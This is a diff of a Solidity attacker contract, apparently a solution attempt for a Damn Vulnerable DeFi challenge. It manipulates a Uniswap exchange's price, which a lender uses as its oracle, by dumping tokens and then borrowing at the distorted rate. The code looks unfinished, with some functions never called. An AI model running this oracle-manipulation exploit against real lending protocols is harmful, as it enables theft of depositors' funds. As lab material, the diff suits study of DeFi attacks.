@@ -1,49 +1,67 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "../DamnValuableToken.sol";
 import "hardhat/console.sol";
 
 contract Taker {
-    address public immutable uniswapPair;
+    using Address for address payable;
+
+    address public immutable uniswapExchange;
     DamnValuableToken public immutable token;
     address lender;
-    
-    constructor(address tokenAddress, address uniswapPairAddress, address _lender) payable {
+       
+    constructor(address tokenAddress, address uniswapExchangeAddress, address _lender) payable {
         token = DamnValuableToken(tokenAddress);
-        uniswapPair = uniswapPairAddress;
+        uniswapExchange = uniswapExchangeAddress;
         lender = _lender;
-
-        (bool success1, bytes memory result1) = lender.call{value: msg.value}(
+        
+        (bool successBorrow, ) = lender.call{value: address(this).balance}(
             abi.encodeWithSignature(
                 "borrow(uint256,address)",
-                10 * 10 ** 18,
+                token.balanceOf(address(lender)),
+                msg.sender
+            )
+        );
+        console.log("successBorrow", successBorrow);
+    }
+   
+    function iterator(uint256 deposit, uint8 index) private {
+        uint256 amount = calculateBorrowAmount(deposit);
+        (bool successBorrow, ) = lender.call{value: deposit}(
+            abi.encodeWithSignature(
+                "borrow(uint256,address)",
+                amount,
                 address(this)
             )
         );
-        console.log(success1);
-
-        token.approve(uniswapPair, token.balanceOf(address(this)));
-
-        (bool success2, bytes memory result2) = uniswapPair.call(
+        // console.log("borrow", index, successBorrow);
+        // console.log("ethBalance", address(this).balance);
+        // console.log("tokenBalance", token.balanceOf(address(this)));
+        
+        token.approve(uniswapExchange, token.balanceOf(address(this)));
+        
+        (bool successSwap, ) = uniswapExchange.call(
         abi.encodeWithSignature(
             "tokenToEthSwapInput(uint256,uint256,uint256)",
             token.balanceOf(address(this)),
-            10 ** 18,
+            1,
             block.timestamp * 2
             )
         );
-        console.log(success2);
-
-        (bool success3, bytes memory result3) = lender.call{value: msg.value}(
-            abi.encodeWithSignature(
-                "borrow(uint256,address)",
-                2 * 10 ** 18,
-                address(this)
-            )
-        );
-        console.log(success3);
+        // console.log("swap", index, successSwap);
+        // console.log("ethBalance", address(this).balance);
+        // console.log("tokenBalance", token.balanceOf(address(this)));
+        // console.log("_computeOraclePrice", _computeOraclePrice());  
     }
-} 
+
+    function calculateBorrowAmount(uint256 deposit) public view returns (uint256) {
+        return ((deposit * 10 ** 18) / (_computeOraclePrice() * 2));
+    }
+
+    function _computeOraclePrice() private view returns (uint256) {
+        // calculates the price of the token in wei according to Uniswap Exchange
+        return uniswapExchange.balance * (10 ** 18) / token.balanceOf(uniswapExchange);
+    }
+}
